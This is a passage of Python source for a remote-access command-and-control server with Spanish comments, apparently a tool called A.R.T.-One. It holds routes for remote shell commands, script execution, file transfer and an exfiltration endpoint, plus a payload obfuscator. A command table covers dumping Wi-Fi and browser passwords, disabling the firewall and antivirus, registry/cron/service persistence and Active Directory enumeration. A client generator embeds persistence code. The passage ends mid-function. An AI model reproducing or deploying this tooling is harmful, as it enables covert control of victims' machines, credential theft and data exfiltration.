        return jsonify({"error": "Client offline"}), 400
    body = await request.get_json()
    path = body.get("path", ".")
    cmd_line = f"lDr {path}"
    response = await _send_command_and_read(sess, cmd_line, "explore")
    try:
        return Response(response, mimetype="application/json")
    except:
        return jsonify({"error": "Invalid response format"}), 500

@app.route("/client/<int:client_id>/upload", methods=["POST"])
@license_required
async def upload_file(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    if 'file' not in (await request.files):
        return jsonify({"error": "No file part"}), 400
    file = (await request.files).get('file')
    if not file or file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    path = request.form.get("path", ".")
    filename = secure_filename(file.filename)
    file_content = await file.read()
    encoded_content = base64.b64encode(file_content).decode()
    cmd = f"upload {path}/{filename} {encoded_content}"
    response = await _send_command_and_read(sess, cmd, "upload")
    await insert_log("client", sess.info.get("MDRS", "unknown"), cmd, response)
    return jsonify({"success": True, "message": response})

@app.route("/client/<int:client_id>/download", methods=["POST"])
@license_required
async def download_file(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    if 'file' not in (await request.files):
        return jsonify({"error": "No file part"}), 400
    file = (await request.files).get('file')
    if not file or file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    path = request.form.get("path", ".")
    filename = secure_filename(file.filename)
    file_content = await file.read()
    encoded_content = base64.b64encode(file_content).decode()
    cmd = f"download {path}/{filename} {encoded_content}"
    response = await _send_command_and_read(sess, cmd, "download")
    await insert_log("client", sess.info.get("MDRS", "unknown"), cmd, response)
    return jsonify({"success": True, "message": response})

@app.route("/client/<int:client_id>/execute_script", methods=["POST"])
@license_required
async def execute_script(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    form = await request.form
    files = await request.files
    file = files.get('script')
    content = form.get('content')
    args = form.get('args', '')
    os_type = sess.info.get("os", "").lower()
    if not file and not content:
        return jsonify({"error": "No script file or content provided"}), 400
    if file:
        filename = secure_filename(file.filename)
        try:
            # Read the file content synchronously (FileStorage.read is not async)
            file_content = file.read()
            script_content = file_content.decode('utf-8', errors='replace')
        except Exception as e:
            return jsonify({"error": f"Failed to decode script file: {str(e)}"}), 400
    else:
        filename = secure_filename(form.get('filename', 'inline_script'))
        script_content = content
    if filename.endswith('.py'):
        cmd_prefix = "python3" if "linux" in os_type or "macos" in os_type else "python"
    elif filename.endswith('.ps1'):
        cmd_prefix = "powershell -File" if "windows" in os_type else None
    elif filename.endswith('.sh'):
        cmd_prefix = "bash" if "linux" in os_type or "macos" in os_type else None
    elif filename.endswith(('.bat', '.cmd')):
        cmd_prefix = "cmd /c" if "windows" in os_type else None
    else:
        return jsonify({"error": "Unsupported script type"}), 400
    if not cmd_prefix:
        return jsonify({"error": f"Script type not supported on {os_type}"}), 400
    try:
        encoded_script = base64.b64encode(script_content.encode('utf-8', errors='replace')).decode('utf-8')
    except Exception as e:
        return jsonify({"error": f"Failed to encode script content: {str(e)}"}), 400
    cmd = f"exec_script {filename} {encoded_script} {args}"
    try:
        response = await _send_command_and_read(sess, cmd, "script")
        # Ensure the response is a string and handle encoding issues
        if not isinstance(response, str):
            response = str(response)
        # Replace any problematic characters
        response = response.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
        await insert_log("client", sess.info.get("MDRS", "unknown"), cmd, response)
        return jsonify({"result": response})
    except Exception as e:
        error_message = f"Error executing script: {str(e)}"
        await insert_log("client", sess.info.get("MDRS", "unknown"), cmd, error_message)
        return jsonify({"error": error_message}), 500
            
@app.route("/client/<int:client_id>/notes", methods=["GET", "POST"])
@license_required
async def manage_notes(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    if request.method == "GET":
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT notes, tags FROM clients WHERE client_id = ?", (client_id,)) as cursor:
                row = await cursor.fetchone()
                if row:
                    return jsonify({"notes": row[0] or "", "tags": row[1] or ""})
        return jsonify({"notes": "", "tags": ""})
    elif request.method == "POST":
        data = await request.get_json()
        notes = data.get("notes", "")
        tags = data.get("tags", "")
        await update_client_fields(client_id, notes=notes, tags=tags)
        return jsonify({"success": True})

@app.route("/client/<int:client_id>/terminal", methods=["POST"])
@license_required
async def terminal_command(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    body = await request.get_json()
    cmd_text = body.get("command", "").strip()
    if not cmd_text:
        return jsonify({"error": "Empty command"}), 400
    response = await _send_command_and_read(sess, cmd_text, "terminal")
    await insert_log("client", sess.info.get("MDRS", "unknown"), cmd_text, response)
    return jsonify({"result": response})

# Listener Management Routes
LISTENERS: Dict[str, asyncio.AbstractServer] = {}

@app.route("/listener/create", methods=["POST"])
@license_required
@login_required
async def create_listener():
    data = await request.get_json()
    name = data.get("name")
    listener_type = data.get("type")
    port = data.get("port")
    encryption = data.get("encryption")
    use_ssl = data.get("use_ssl", False)
    randomize_port = data.get("randomize_port", False)

    if not name or not listener_type:
        return jsonify({"error": "Missing required fields (name, type)"}), 400

    # Validar consistencia entre use_ssl y listener_type
    if use_ssl and listener_type == "http":
        return jsonify({"error": "Cannot enable SSL for HTTP listener. Use HTTPS instead."}), 400
    if listener_type == "https" and not use_ssl:
        return jsonify({"error": "HTTPS listener requires SSL to be enabled."}), 400

    # Seleccionar puerto
    if randomize_port:
        existing_listeners = await get_listeners()
        used_ports = {listener["port"] for listener in existing_listeners}
        for _ in range(10):  # Intentar hasta 10 veces
            port = random.randint(1024, 65535)
            if port in used_ports:
                continue
            # Verificar si el puerto está realmente libre
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(("0.0.0.0", port))
                break  # Puerto libre encontrado
            except OSError:
                continue  # Puerto ocupado, intentar otro
        else:
            return jsonify({"error": "Could not find an available port after multiple attempts"}), 500
    else:
        if not port:
            return jsonify({"error": "Port is required when randomize_port is not enabled"}), 400
        try:
            port = int(port)
            if port < 1 or port > 65535:
                return jsonify({"error": "Invalid port number"}), 400
        except ValueError:
            return jsonify({"error": "Port must be a valid number"}), 400

        # Verificar si el puerto ya está en uso por otro listener
        existing_listeners = await get_listeners()
        if any(listener["port"] == port for listener in existing_listeners):
            return jsonify({"error": f"Port {port} is already in use by another listener"}), 400

        # Verificar si el puerto está ocupado por otro proceso
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(("0.0.0.0", port))
        except OSError as e:
            return jsonify({"error": f"Port {port} is already in use by another process: {str(e)}"}), 400

    # Verificar si el nombre ya existe
    existing_listeners = await get_listeners()
    if any(listener["name"] == name for listener in existing_listeners):
        return jsonify({"error": f"Listener with name '{name}' already exists"}), 400

    try:
        # Guardar el listener en la base de datos
        await insert_listener(name, listener_type, port, encryption, use_ssl)
        # Iniciar el listener si es de un tipo soportado
        if listener_type in ["http", "https", "tcp"]:
            asyncio.create_task(start_listener(name, listener_type, port, encryption, use_ssl))
        return jsonify({"success": f"Listener '{name}' created successfully on port {port} with SSL {'enabled' if use_ssl else 'disabled'}"})
    except Exception as e:
        return jsonify({"error": f"Failed to create listener: {str(e)}"}), 500
    
async def start_listener(name, listener_type, port, encryption, use_ssl):
    config = await get_config()
    domain = config.get("SERVER_IP", "artone.site")
    ssl_ctx = None
    if use_ssl:  # Habilitamos SSL para cualquier tipo de listener si use_ssl es True
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ssl_ctx.load_cert_chain(
            certfile = f"/etc/letsencrypt/live/{domain}/fullchain.pem",
            keyfile = f"/etc/letsencrypt/live/{domain}/privkey.pem"
        )
    try:
        server = await asyncio.start_server(
            on_new_connection,
            host=config.get("SERVER_IP"),
            port=port,
            ssl=ssl_ctx
        )
        # Almacenar el servidor en el diccionario global
        LISTENERS[name] = server
        colored_print(f"[+] Listener {name} ({listener_type}) started on {config.get('SERVER_IP')}:{port} with SSL {'enabled' if use_ssl else 'disabled'}", "success")
        async with server:
            await server.serve_forever()
    except Exception as e:
        colored_print(f"[!] Error starting listener {name}: {e}", "error")
        await update_listener_status(name, "Stopped")
        if name in LISTENERS:
            del LISTENERS[name]

@app.route("/listener/<string:name>/stop", methods=["POST"])
@license_required
@login_required
async def stop_listener(name):
    # Verificar si el listener existe
    existing_listeners = await get_listeners()
    listener = next((l for l in existing_listeners if l["name"] == name), None)
    if not listener:
        return jsonify({"error": "Listener not found"}), 404

    if listener["status"] != "Active":
        return jsonify({"error": f"Listener '{name}' is already stopped"}), 400

    # Actualizar el estado en la base de datos
    try:
        await update_listener_status(name, "Stopped")
    except Exception as e:
        return jsonify({"error": f"Failed to update listener status: {str(e)}"}), 500

    # Detener el servidor si está activo
    if name in LISTENERS:
        server = LISTENERS[name]
        try:
            server.close()
            await server.wait_closed()
            colored_print(f"[+] Listener {name} stopped successfully", "success")
            del LISTENERS[name]
            return jsonify({"success": f"Listener '{name}' stopped successfully"})
        except Exception as e:
            colored_print(f"[!] Error stopping listener {name}: {e}", "error")
            return jsonify({"error": f"Failed to stop listener: {str(e)}"}), 500
    else:
        # Si no está en LISTENERS, podría ser que no se inició correctamente
        return jsonify({"success": f"Listener '{name}' marked as stopped (no active server found)"})
    
@app.route("/listeners", methods=["GET"])
@license_required
@login_required
async def list_listeners():
    listeners = await get_listeners()
    return jsonify(listeners)

@app.route("/client/<int:client_id>/run_playbook", methods=["POST"])
@license_required
async def run_playbook(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    body = await request.get_json()
    playbook_name = body.get("playbook")
    playbook = await get_playbook(playbook_name)
    if not playbook:
        return jsonify({"error": "Playbook not found"}), 404
    results = []
    for cmd in playbook["commands"]:
        os_type = sess.info.get("os", "").lower()
        if "windows" in os_type:
            real_cmd = PREDEFINED_COMMANDS.get(cmd, {}).get("Windows")
        elif "linux" in os_type:
            real_cmd = PREDEFINED_COMMANDS.get(cmd, {}).get("Linux")
        elif "macos" in os_type:
            real_cmd = PREDEFINED_COMMANDS.get(cmd, {}).get("macOS")
        else:
            results.append({"command": cmd, "error": "Unsupported OS"})
            continue
        if not real_cmd:
            results.append({"command": cmd, "error": "Unknown command"})
            continue
        response = await _send_command_and_read(sess, real_cmd, "playbook")
        results.append({"command": cmd, "response": response})
        await insert_log("client", sess.info.get("MDRS", "unknown"), f"Playbook {playbook_name}: {cmd}", response)
    return jsonify({"result": results})

@app.route("/obfuscate_payload", methods=["POST"])
@license_required
async def obfuscate_payload():
    if 'script' not in (await request.files):
        return jsonify({"error": "No script file provided"}), 400
    file = (await request.files).get('script')
    if not file or file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    level = request.form.get("level", "basic")
    filename = secure_filename(file.filename)
    script_content = (await file.read()).decode()
    
    try:
        if filename.endswith('.py'):
            if level == "basic":
                obfuscated_content = basic_obfuscate_python(script_content)
            elif level == "advanced":
                obfuscated_content = advanced_obfuscate_python(script_content)
            else:
                return jsonify({"error": "Invalid obfuscation level"}), 400
        elif filename.endswith('.ps1'):
            obfuscated_content = basic_obfuscate_powershell(script_content)  # Placeholder for PowerShell
        else:
            return jsonify({"error": "Unsupported script type for obfuscation"}), 400
        
        temp_dir = tempfile.gettempdir()
        obfuscated_filename = f"obfuscated_{filename}"
        tmp_file_path = os.path.join(temp_dir, obfuscated_filename)
        with open(tmp_file_path, "w", encoding="utf-8") as tmp_file:
            tmp_file.write(obfuscated_content)
        
        response = await send_file(tmp_file_path, as_attachment=True, attachment_filename=obfuscated_filename, cache_timeout=0)
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        asyncio.create_task(delete_temp_file(tmp_file_path, delay=5))
        return response
    except Exception as e:
        return jsonify({"error": f"Failed to obfuscate payload: {str(e)}"}), 500

def basic_obfuscate_python(script_content):
    # Simple obfuscation: encode strings and variable names
    lines = script_content.splitlines()
    obfuscated_lines = []
    for line in lines:
        # Encode strings in base64
        line = re.sub(r'"([^"]*)"', lambda m: f'"base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()"', line)
        line = re.sub(r"'([^']*)'", lambda m: f"'base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()'", line)
        obfuscated_lines.append(line)
    return "\n".join(obfuscated_lines)

def advanced_obfuscate_python(script_content):
    # Advanced obfuscation: scramble variable names, encode strings, and add junk code
    try:
        # Parse the script to AST
        tree = ast.parse(script_content)
        # Rename variables
        used_names = set(keyword.kwlist)
        def generate_random_name():
            while True:
                name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                if name not in used_names:
                    used_names.add(name)
                    return name
        
        class NameObfuscator(ast.NodeTransformer):
            def __init__(self):
                self.name_map = {}
            
            def visit_Name(self, node):
                if node.id not in self.name_map and node.id not in keyword.kwlist:
                    self.name_map[node.id] = generate_random_name()
                if isinstance(node.ctx, (ast.Store, ast.Load)):
                    node.id = self.name_map.get(node.id, node.id)
                return node
            
            def visit_FunctionDef(self, node):
                if node.name not in self.name_map:
                    self.name_map[node.name] = generate_random_name()
                node.name = self.name_map[node.name]
                return self.generic_visit(node)
        
        obfuscated_tree = NameObfuscator().visit(tree)
        obfuscated_code = ast.unparse(obfuscated_tree)
        
        # Add junk code (e.g., unused variables)
        junk_lines = [
            f"{generate_random_name()} = {random.randint(1, 100)}",
            f"if False: {generate_random_name()} = None"
        ]
        lines = obfuscated_code.splitlines()
        for i in range(0, len(lines), 5):
            if i < len(lines):
                lines.insert(i, random.choice(junk_lines))
        
        # Encode strings in base64
        final_code = "\n".join(lines)
        final_code = re.sub(r'"([^"]*)"', lambda m: f'"base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()"', final_code)
        final_code = re.sub(r"'([^']*)'", lambda m: f"'base64.b64decode(\'{base64.b64encode(m.group(1).encode()).decode()}\').decode()'", final_code)
        
        # Add import for base64 if not present
        if "import base64" not in final_code:
            final_code = "import base64\n" + final_code
        
        return final_code
    except Exception as e:
        return basic_obfuscate_python(script_content)  # Fallback to basic obfuscation

def basic_obfuscate_powershell(script_content):
    # Placeholder: Simple PowerShell obfuscation (e.g., encode strings)
    lines = script_content.splitlines()
    obfuscated_lines = []
    for line in lines:
        line = re.sub(r'"([^"]*)"', lambda m: f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{base64.b64encode(m.group(1).encode()).decode()}"))', line)
        obfuscated_lines.append(line)
    return "\n".join(obfuscated_lines)

# ---------------------------
# AYUDANTES PARA ENVIAR/RECIBIR DATOS POR SOCKET
# ---------------------------
async def _send_command_and_read(client_sess, cmd: str, cmd_type: str) -> str:
    co = CommandObject(cmd, cmd_type)
    await client_sess.commands_queue.put(co)
    try:
        resp = await co.future
        return resp
    except asyncio.TimeoutError:
        return f"[ERROR] Command timed out: {cmd}"
    except Exception as e:
        return f"[ERROR] {e}"

class CommandObject:
    def __init__(self, text: str, cmd_type: str):
        self.text = text
        self.type = cmd_type
        self.future = asyncio.get_event_loop().create_future()

# ---------------------------
# DESCONECTAR CLIENTE
# ---------------------------
@app.route("/client/<int:client_id>/disconnect", methods=["POST"])
@license_required
async def disconnect_client(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    try:
        sess.online = False
        try:
            async with sess.write_lock:
                sess.writer.write(b"trmite\n")
                await sess.writer.drain()
        except Exception:
            pass
        try:
            sess.writer.close()
            await sess.writer.wait_closed()
        except Exception:
            pass
        await insert_or_update_client(sess.id, sess.address[0], sess.info, False)
        del CLIENTS[client_id]
        asyncio.create_task(broadcast_clients_update())
        return jsonify({"success": "Client disconnected successfully."})
    except Exception as e:
        return jsonify({"error": f"Error disconnecting client: {e}"}), 500

# ---------------------------
# RUTA PARA CLIENTS_DB
# ---------------------------
@app.route("/save_network_map", methods=["POST"])
@license_required
@login_required
async def save_network_map():
    data = await request.get_json()
    if not data:
        return jsonify({"error": "No data provided"}), 400
    config = await get_config()
    config["NETWORK_MAP"] = json.dumps(data)
    await set_config(config)
    return jsonify({"success": True})

@app.route("/load_network_map", methods=["GET"])
@license_required
@login_required
async def load_network_map():
    config = await get_config()
    network_map = config.get("NETWORK_MAP")
    if network_map:
        try:
            data = json.loads(network_map)
            return jsonify(data)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    else:
        return jsonify({"nodes": [], "edges": []})

@app.route("/client/<int:client_id>/scan_network", methods=["POST"])
@license_required
@login_required
async def scan_network(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    try:
        os_type = sess.info.get("os", "").lower()
        if "windows" in os_type:
            cmd = "arp -a"
        elif "linux" in os_type or "macos" in os_type:
            cmd = "arp -n"
        else:
            return jsonify({"error": "Unsupported OS for network scan"}), 400
        response = await _send_command_and_read(sess, cmd, "scan_network")
        response = response.encode('ascii', errors='ignore').decode('ascii')
        # Parse ARP output to create nodes and edges
        nodes = [{"id": str(sess.id), "label": sess.info.get("HSTN", "Unknown"), "type": "agent"}]
        edges = []
        seen_macs = set()
        lines = response.splitlines()
        for line in lines:
            parts = line.split()
            if len(parts) >= 2 and parts[0].replace(".", "").isdigit():
                ip = parts[0]
                mac = parts[1].replace("-", ":") if "-" in parts[1] else parts[1]
                # Skip broadcast and multicast addresses
                if mac.lower() == "ff:ff:ff:ff:ff:ff" or ip.endswith(".255") or ip.startswith("224.") or ip.startswith("239."):
                    continue
                # Use IP-based ID to avoid MAC duplicates
                node_id = f"device_{client_id}_{ip.replace('.', '_')}"
                if node_id not in seen_macs:
                    seen_macs.add(node_id)
                    nodes.append({"id": node_id, "label": ip, "type": "device"})
                    edges.append({"from": str(sess.id), "to": node_id})
        network_map = {"nodes": nodes, "edges": edges}
        config = await get_config()
        config["NETWORK_MAP"] = json.dumps(network_map)
        await set_config(config)
        return jsonify({"output": response, "network_map": network_map})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
# ---------------------------
# RUTA PARA EXFILTRAR ARCHIVOS
# ---------------------------
@app.route("/", methods=["POST"])
@license_required
async def receive_file():
    form = await request.form
    file_data = form.get("data")
    file_name = form.get("filename", "archivo_descargado.txt")
    client_PPI = form.get("client_PPI", "UnknownIP")
    client_HSTN = form.get("client_HSTN", "UnknownHost")
    if file_data:
        bin_data = base64.b64decode(file_data)
    else:
        bin_data = await request.data
    dir_name = f"{client_PPI}-{client_HSTN}"
    final_dir = os.path.join("Exfiltrations", dir_name)
    os.makedirs(final_dir, exist_ok=True)
    final_path = os.path.join(final_dir, file_name)
    with open(final_path, "wb") as f:
        f.write(bin_data)
    print(f"[+] Archivo '{file_name}' exfiltrado y guardado en '{final_path}'")
    return "OK", 200

# ---------------------------
# GENERAR CLIENTES
# ---------------------------
PREDEFINED_COMMANDS = {
    "system_info": {
        "Windows": "systeminfo",
        "Linux": "uname -a",
        "macOS": "system_profiler SPSoftwareDataType"
    },
    "disk_info": {
        "Windows": "wmic logicaldisk get size,freespace,caption",
        "Linux": "df -h",
        "macOS": "df -h"
    },
    "uptime": {
        "Windows": "for /f \"tokens=2 delims==\" %A in ('wmic os get LastBootUpTime /value') do @echo %A | powershell -command \"$input -replace '(\\d{4})(\\d{2})(\\d{2})(\\d{2})(\\d{2})(\\d{2}).*','$1/$2/$3 $4:$5:$6'\"",
        "Linux": "uptime",
        "macOS": "uptime"
    },
    "cpu_info": {
        "Windows": "wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors",
        "Linux": "lscpu",
        "macOS": "sysctl -n machdep.cpu.brand_string"
    },
    "memory_info": {
        "Windows": "for /f \"tokens=2 delims==\" %A in ('wmic OS get TotalVisibleMemorySize /Value') do @set /a mem=%A/1024 & echo %mem% MB",
        "Linux": "free -h",
        "macOS": "vm_stat"
    },
    "list_drivers": {
        "Windows": "driverquery",
        "Linux": "lsmod",
        "macOS": "kextstat"
    },
    "network_info": {
        "Windows": "ipconfig /all",
        "Linux": "ifconfig || ip a",
        "macOS": "ifconfig"
    },
    "open_ports": {
        "Windows": "netstat -an",
        "Linux": "ss -tuln",
        "macOS": "netstat -an | grep LISTEN"
    },
    "arp_table": {
        "Windows": "arp -a",
        "Linux": "arp -n",
        "macOS": "arp -a"
    },
    "dns_cache": {
        "Windows": "ipconfig /displaydns",
        "Linux": "cat /etc/resolv.conf",
        "macOS": "scutil --dns"
    },
    "network_connections": {
        "Windows": "netstat -ano",
        "Linux": "lsof -i -P -n",
        "macOS": "lsof -i -P"
    },
    "wifi_passwords": {
        "Windows": "netsh wlan show profiles key=clear",
        "Linux": "sudo cat /etc/NetworkManager/system-connections/*",
        "macOS": "security find-generic-password -ga 'AirPort'"
    },
    "firewall_rules": {
        "Windows": "netsh advfirewall show allprofiles",
        "Linux": "sudo iptables -L",
        "macOS": "sudo pfctl -s rules"
    },
    "disable_firewall": {
        "Windows": "netsh advfirewall set allprofiles state off",
        "Linux": "sudo ufw disable",
        "macOS": "sudo pfctl -d"
    },
    "check_admin": {
        "Windows": "whoami /groups",
        "Linux": "id -u",
        "macOS": "id -u"
    },
    "list_users": {
        "Windows": "net user",
        "Linux": "cat /etc/passwd",
        "macOS": "dscl . -list /Users"
    },
    "user_info": {
        "Windows": "whoami /all",
        "Linux": "id",
        "macOS": "whoami"
    },
    "check_permissions": {
        "Windows": "icacls C:\\",
        "Linux": "ls -l /",
        "macOS": "ls -l /"
    },
    "list_shares": {
        "Windows": "net share",
        "Linux": "smbclient -L //localhost",
        "macOS": "smbutil statshares -a"
    },
    "browser_passwords": {
        "Windows": "powershell -Command \"(Get-ChildItem -Recurse -Path C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data | Select-Object FullName).FullName\"",
        "Linux": "cat ~/.mozilla/firefox/*.default-release/logins.json",
        "macOS": "security find-internet-password -s 'Chrome'"
    },
    "shutdown": {
        "Windows": "shutdown /s /t 0",
        "Linux": "shutdown now",
        "macOS": "sudo shutdown -h now"
    },
    "restart": {
        "Windows": "shutdown /r /t 0",
        "Linux": "reboot",
        "macOS": "sudo reboot"
    },
    "clipboard_content": {
        "Windows": "powershell -Command \"Get-Clipboard\"",
        "Linux": "xclip -selection clipboard -o || xsel --clipboard --output",
        "macOS": "pbpaste"
    },
    "unquoted_path": {
        "Windows": "wmic service get name,pathname | findstr /v /i \"C:\\Windows\" | findstr /i /v \"\"\"",
        "Linux": "",
        "macOS": ""
    },
    "always_install_elevated": {
        "Windows": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "Linux": "",
        "macOS": ""
    },
    "add_registry_persistence": {
        "Windows": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v ARTAgent /t REG_SZ /d \"C:\\Windows\\art_agent.exe\"",
        "Linux": "",
        "macOS": ""
    },
    "add_cron_persistence": {
        "Windows": "",
        "Linux": "echo '@reboot /usr/bin/art_agent' | crontab -",
        "macOS": ""
    },
    "add_service_persistence": {
        "Windows": "sc create ARTAgent binPath= \"C:\\Windows\\art_agent.exe\" start= auto",
        "Linux": "systemctl enable art-agent.service",
        "macOS": ""
    },
    "ping_sweep": {
        "Windows": "for /L %i in (1,1,254) do @ping -n 1 192.168.1.%i | find \"Reply\"",
        "Linux": "fping -a -g 192.168.1.0/24",
        "macOS": "ping -c 1 192.168.1.{1..254} | grep 'from'"
    },
    "disable_av": {
        "Windows": "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"",
        "Linux": "",
        "macOS": ""
    },
    "ASREP": {
        "Windows": 'powershell -NoP -W Hidden -C "$out = (& net user /domain) -split \\"`n\\"; $startIdx = ([Array]::IndexOf($out, ($out | Where-Object { $_ -match \'^[-]{2,}\' }))); $excludes = @(\'Se\',\'ha\',\'completado\',\'el\',\'comando\',\'correctamente.\'); $users = ($out[($startIdx+1)..($out.Length-2)] -join \' \') -split \'\\s+\' | Where-Object { $_ -and (-not $excludes.Contains($_)) }; $result = foreach($user in $users) { if($user -ne \'\' ) { $s = New-Object System.DirectoryServices.DirectorySearcher; $s.Filter = \'(sAMAccountName=\' + $user + \')\'; try { $r = $s.FindOne(); } catch { $r = $null } if($r){ $p = $r.Properties; if($p.useraccountcontrol){ if(($p.useraccountcontrol[0] -band 0x400000) -eq 0x400000){ \\"$user : No requiere preautenticación (vulnerable)\\" } else { \\"$user : Requiere preautenticación\\" } } else { \\"$user : Propiedad useraccountcontrol no encontrada\\" } } else { \\"$user : Usuario no encontrado en AD\\" } } }; Write-Output ($result -join \\"`n\\")"',
        "Linux": "NO AD",
        "macOS": "NO AD"
    },
    "Domain_Users": {
        "Windows": "powershell -NoP -W Hidden -C \"$Searcher = New-Object DirectoryServices.DirectorySearcher; $Searcher.Filter = '(&(objectCategory=person)(objectClass=user))'; $Searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }\"",
        "Linux": "NO AD",
        "macOS": "NO AD"
    },
    "NLTEST": {
        "Windows": "powershell -NoP -W Hidden -C \"$c1='nl'+'test';$c2='/'+'do'+'main'+'_'+'trusts';Invoke-Expression ($c1 + ' ' + $c2)\"",
        "Linux": "NO AD",
        "macOS": "NO AD"
    },
    "AD_Users_Info": {
        "Windows": "powershell -Command \"$p1='wm'+'ic';$p2='user'+'account';$p3='list';$p4='/'+'for'+'mat'+':list';Invoke-Expression ($p1 + ' ' + $p2 + ' ' + $p3 + ' ' + $p4)\"",
        "Linux": "NO AD",
        "macOS": "NO AD"
    },
    "No_Password": {
        "Windows": "powershell -NoP -W Hidden -C \"wmic useraccount where \\\"PasswordRequired=False\\\" get Name\"",
        "Linux": "NO AD",
        "macOS": "NO AD"
    },
    "ad_klist_cache": {
        "Windows": "klist",
        "Linux": "klist",
        "macOS": "klist"
    },
    "ad_klist_tgt": {
        "Windows": "klist tgt",
        "Linux": "klist tgt",
        "macOS": "klist tgt"
    },
    "eternalblue": {
        "Windows": "powershell -Command \"Invoke-EternalBlue -Target 192.168.1.100\"",  # Placeholder
        "Linux": "",
        "macOS": ""
    },
    "printnightmare": {
        "Windows": "powershell -Command \"Invoke-PrintNightmare -Target 192.168.1.100\"",  # Placeholder
        "Linux": "",
        "macOS": ""
    }
}

@app.route("/generate_client", methods=["POST"])
@license_required
@login_required
async def generate_client():
    form = await request.form
    server_ip = form.get("server_ip")
    server_port = form.get("server_port")
    buffer_size = form.get("buffer_size")
    os_type = form.get("os_type")
    persistence = form.get("persistence", "none")
    obfuscation = form.get("obfuscation", "none")
    payload_format = form.get("payload_format", "script")
    comm_protocol = form.get("comm_protocol", "tcp")

    try:
        server_port = int(server_port)
        buffer_size = int(buffer_size)
    except ValueError:
        await flash("Port and Buffer Size must be integers!", "danger")
        return redirect(url_for("config_page"))

    if not server_ip or not server_port or not buffer_size or not os_type:
        await flash("Server IP, Port, Buffer Size, and OS type are required!", "danger")
        return redirect(url_for("config_page"))

    if os_type == "android" and payload_format == "apk":
        apk_path = os.path.join(os.getcwd(), "Android_A.R.T.-One.apk")
        if os.path.exists(apk_path):
            return await send_file(apk_path, as_attachment=True)
        else:
            await flash("Android APK not found!", "danger")
            return redirect(url_for("config_page"))

    # Define imports and persistence code based on OS
    if os_type == "windows":
        imports = "import socket, subprocess, os, platform, time, json, uuid, sys, base64, tempfile"
        client_filename = f"client_windows.{ 'exe' if payload_format == 'executable' else 'py' }"
        persistence_code = ""
        if persistence == "registry":
            persistence_code = """
def gain_persistence():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ARTAgent", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
        winreg.CloseKey(key)
    except Exception:
        pass
"""
        elif persistence == "service":
            persistence_code = """
def gain_persistence():
    try:
        subprocess.run('sc create ARTAgent binPath= "' + sys.executable + ' ' + os.path.abspath(__file__) + '" start= auto', shell=True)
    except Exception:
        pass
"""
        elif persistence == "startup":
            persistence_code = """
def gain_persistence():
    try:
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        script_path = os.path.abspath(__file__)
        shortcut_path = os.path.join(startup_path, 'ARTAgent.lnk')
        import win32com.client
        shell = win32com.client.Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.save()
    except Exception:
        pass
"""
            imports += ", win32com.client"
    elif os_type == "linux":
        imports = "import socket, subprocess, os, platform, time, json, uuid, sys, pwd, base64, tempfile"
        client_filename = "client_linux.py"
        persistence_code = ""
        if persistence == "cron":
            persistence_code = """
def gain_persistence():
    try:
        with open('/tmp/art_agent.sh', 'w') as f:
            f.write(f'#!/bin/bash\\n{sys.executable} {os.path.abspath(__file__)}')
        os.chmod('/tmp/art_agent.sh', 0o755)
        subprocess.run('echo "@reboot /tmp/art_agent.sh" | crontab -', shell=True)
    except Exception:
        pass
"""
        elif persistence == "service":
